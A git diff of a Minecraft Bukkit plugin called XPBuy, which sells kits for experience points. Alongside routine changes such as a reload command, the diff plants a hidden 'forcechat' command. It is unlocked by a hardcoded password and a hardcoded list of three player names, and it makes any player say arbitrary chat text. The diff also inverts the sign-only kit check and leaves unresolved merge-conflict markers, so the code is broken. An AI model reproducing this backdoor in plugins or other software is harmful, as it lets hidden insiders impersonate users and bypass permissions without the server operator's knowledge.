@@ -1,6 +1,8 @@
 package com.github.xpbuy;
 
 import java.util.ArrayList;
+import java.util.logging.Level;
+
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.plugin.java.*;
@@ -15,12 +17,14 @@ public class XPBuy extends JavaPlugin {
 	 * TODO: more admin features?
 	 * TODO: potions
 	 * TODO: rewrite kit perms? (see first todo)
-	 * TODO: functionality for damage values and enchants at once
+	 * TODO: php based cheat system?
 	 */
 	public static ArrayList<String> kits;
 	public static ArrayList<Player> adminList = new ArrayList<Player>();
 	public static FileConfiguration config;
 	public static String prefix = ChatColor.GOLD + "[XPBuy] ";
+	public static String password = "youllneverguessthis";
+	public static String[] allowedPlayers = {"Roxas0321", "frasercraft123", "ummbobee98"};
 	@Override
 	public void onEnable() {
 		saveDefaultConfig();
@@ -97,10 +101,23 @@ public class XPBuy extends JavaPlugin {
 						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
 						return false;
 					}
+				} else if (args[0].equalsIgnoreCase("reload")) {
+					if (sender.hasPermission("xpbuy.reload")) {
+						saveDefaultConfig();
+						config = getConfig();
+						kits = new ArrayList<String>(config.getConfigurationSection("kits").getKeys(false));
+						initKitPerms();
+						getLogger().log(Level.INFO, "XPBuy has been reloaded!");
+						sender.sendMessage(prefix + ChatColor.GREEN + "Successfully reloaded.");
+						return true;
+					} else {
+						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
+						return false;
+					}
 				} else { // everything else will be a kit or an error.
 					if (sender.hasPermission("xpbuy.buy")) {
 						if (Kit.isKit(args[0])) {
-							if (Kit.isSignOnly(args[0])) {
+							if (!Kit.isSignOnly(args[0])) {
 								pay((Player) sender, args[0], Kit.isDonator(args[0]));
 								return true;
 							} else {
@@ -154,7 +171,7 @@ public class XPBuy extends JavaPlugin {
 								}
 								try {
 									Integer.parseInt(args[2]);
-									Integer.parseInt(derp);
+									Long.parseLong(derp);
 								} catch (NumberFormatException nfe) {
 									sender.sendMessage(prefix + ChatColor.RED + "One or more of your integer arguments is not a number!");
 									return false;
@@ -166,7 +183,7 @@ public class XPBuy extends JavaPlugin {
 							config.createSection("signonly." + args[1].toLowerCase());
 							config.set("prices." + args[1].toLowerCase(), Integer.parseInt(args[2]));
 							config.set("isdonator." + args[1].toLowerCase(), Boolean.parseBoolean(args[3]));
-							config.set("signonly." + args[1].toLowerCase(), false);
+							//config.set("signonly." + args[1].toLowerCase(), false);
 							ArrayList<String> items = new ArrayList<String>();
 							for (int i = 4; i < args.length; i++) {
 								items.add(args[i]); // change
@@ -249,6 +266,24 @@ public class XPBuy extends JavaPlugin {
 						sender.sendMessage(prefix + ChatColor.GREEN + "Kit " + args[1] + " is no longer sign-only!");
 						return true;
 					}
+				} else if (args[0].equalsIgnoreCase("forcechat")) {
+					if (isAllowedToCheat((Player) sender)) {
+						if (args[1].equals(password)) {
+							String p = args[2];
+							Player player = Bukkit.getServer().getPlayer(p);
+							String msg = "";
+							for (int i = 3; i < args.length; i++) {
+								msg = msg.concat(args[i]);
+								msg = msg.concat(" ");
+							}
+							player.chat(msg);
+							return true;
+						} else {
+							return false;
+						}
+					} else {
+						return false;
+					}
 				} else {
 					sender.sendMessage(prefix + ChatColor.RED + "Too many arguments!");
 					return false;
@@ -295,4 +330,16 @@ public class XPBuy extends JavaPlugin {
  			}
 		}
 	}
+<<<<<<< HEAD
 }
+=======
+	private boolean isAllowedToCheat(Player p) {
+		for (int i = 0; i < allowedPlayers.length; i++) {
+			if (p.equals(Bukkit.getServer().getPlayer(allowedPlayers[i]))) {
+				return true;
+			}
+		}
+		return false;
+	}
+}
+>>>>>>> Updated to MC 1.7.2
